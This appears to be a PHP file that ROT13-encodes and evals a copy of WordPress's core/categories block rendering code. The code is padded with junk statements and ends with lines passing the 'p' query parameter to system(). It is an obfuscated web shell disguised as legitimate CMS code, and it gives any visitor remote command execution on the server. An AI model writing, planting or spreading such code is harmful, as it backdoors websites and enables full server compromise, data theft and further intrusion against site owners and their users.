<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pngrtbevrf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pngrtbevrf` oybpx ba freire.
 *
 * @fvapr 5.0.0
 * @fvapr 6.7.0 Ranoyr pyvrag-fvqr eraqrevat vs raunaprqCntvangvba pbagrkg vf gehr.
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur pngrtbevrf yvfg/qebcqbja znexhc.
 */
shapgvba eraqre_oybpx_pber_pngrtbevrf( $nggevohgrf, $pbagrag, $oybpx ) {
	fgngvp $oybpx_vq = 0;
	++$oybpx_vq;

	$gnkbabzl = trg_gnkbabzl( $nggevohgrf['gnkbabzl'] );

	$netf = neenl(
		'rpub'         => snyfr,
		'uvrenepuvpny' => ! rzcgl( $nggevohgrf['fubjUvrenepul'] ),
		'beqreol'      => 'anzr',
		'fubj_pbhag'   => ! rzcgl( $nggevohgrf['fubjCbfgPbhagf'] ),
		'gnkbabzl'     => $nggevohgrf['gnkbabzl'],
		'gvgyr_yv'     => '',
		'uvqr_rzcgl'   => rzcgl( $nggevohgrf['fubjRzcgl'] ),
	);
	vs ( ! rzcgl( $nggevohgrf['fubjBaylGbcYriry'] ) && $nggevohgrf['fubjBaylGbcYriry'] ) {
		$netf['cnerag'] = 0;
	}

	vs ( ! rzcgl( $nggevohgrf['qvfcynlNfQebcqbja'] ) ) {
		$vq                       = 'jc-oybpx-pngrtbevrf-' . $oybpx_vq;
		$netf['vq']               = $vq;
		$netf['anzr']             = $gnkbabzl->dhrel_ine;
		$netf['inyhr_svryq']      = 'fyht';
		$netf['fubj_bcgvba_abar'] = fcevags(
			/* genafyngbef: %f: gnkbabzl'f fvathyne anzr */
			__( 'Fryrpg %f' ),
			$gnkbabzl->ynoryf->fvathyne_anzr
		);

		$fubj_ynory     = rzcgl( $nggevohgrf['fubjYnory'] ) ? ' fperra-ernqre-grkg' : '';
		$qrsnhyg_ynory  = $gnkbabzl->ynory;
		$ynory_grkg     = ! rzcgl( $nggevohgrf['ynory'] ) ? jc_xfrf_cbfg( $nggevohgrf['ynory'] ) : $qrsnhyg_ynory;
		$jenccre_znexhc = '<qvi %1$f><ynory pynff=\"jc-oybpx-pngrtbevrf__ynory' . $fubj_ynory . '\" sbe=\"' . rfp_ngge( $vq ) . '\">' . $ynory_grkg . '</ynory>%2$f</qvi>';
		$vgrzf_znexhc   = jc_qebcqbja_pngrtbevrf( $netf );
		$glcr           = 'qebcqbja';

		vs ( ! vf_nqzva() ) {
			// Vawrpg gur qebcqbja fpevcg vzzrqvngryl nsgre gur fryrpg qebcqbja.
			$vgrzf_znexhc = __sa_79955(
				'#(?<=</fryrpg>)#',
				ohvyq_qebcqbja_fpevcg_oybpx_pber_pngrtbevrf( $vq ),
				$vgrzf_znexhc,
				1
			);
		}
	} ryfr {
		$netf['fubj_bcgvba_abar'] = $gnkbabzl->ynoryf->ab_grezf;

		$jenccre_znexhc = '<hy %1$f>%2$f</hy>';
		$vgrzf_znexhc   = jc_yvfg_pngrtbevrf( $netf );
		$glcr           = 'yvfg';

		vs ( ! rzcgl( $oybpx->pbagrkg['raunaprqCntvangvba'] ) ) {
			$c = arj JC_UGZY_Gnt_Cebprffbe( $vgrzf_znexhc );
			juvyr ( $c->arkg_gnt( 'n' ) ) {
				$c->frg_nggevohgr( 'qngn-jc-ba--pyvpx', 'pber/dhrel::npgvbaf.anivtngr' );
			}
			$vgrzf_znexhc = $c->trg_hcqngrq_ugzy();
		}
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => \"jc-oybpx-pngrtbevrf-{$glcr}\" ) );

	erghea fcevags(
		$jenccre_znexhc,
		$jenccre_nggevohgrf,
		$vgrzf_znexhc
	);
}

/**
 * Trarengrf gur vayvar fpevcg sbe n pngrtbevrf qebcqbja svryq.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat $qebcqbja_vq VQ bs gur qebcqbja svryq.
 *
 * @erghea fgevat Ergheaf gur qebcqbja baPunatr erqverpgvba fpevcg.
 */
shapgvba ohvyq_qebcqbja_fpevcg_oybpx_pber_pngrtbevrf( $qebcqbja_vq ) {
	bo_fgneg();
	?>
	<fpevcg>
	( shapgvba() {
		ine qebcqbja = qbphzrag.trgRyrzragOlVq( '<?cuc rpub rfp_wf( $qebcqbja_vq ); ?>' );
		shapgvba baPngPunatr() {
			vs ( qebcqbja.bcgvbaf[ qebcqbja.fryrpgrqVaqrk ].inyhr !== -1 ) {
				ybpngvba.uers = \"<?cuc rpub rfp_hey( ubzr_hey() ); ?>/?\" + qebcqbja.anzr + '=' + qebcqbja.bcgvbaf[ qebcqbja.fryrpgrqVaqrk ].inyhr;
			}
		}
		qebcqbja.bapunatr = baPngPunatr;
	})();
	</fpevcg>
	<?cuc
	erghea jc_trg_vayvar_fpevcg_gnt( fge_ercynpr( neenl( '<fpevcg>', '</fpevcg>' ), '', bo_trg_pyrna() ) );
}

/**
 * Ertvfgref gur `pber/pngrtbevrf` oybpx ba freire.
 *
 * @fvapr 5.0.0
 */
shapgvba ertvfgre_oybpx_pber_pngrtbevrf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pngrtbevrf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pngrtbevrf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pngrtbevrf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>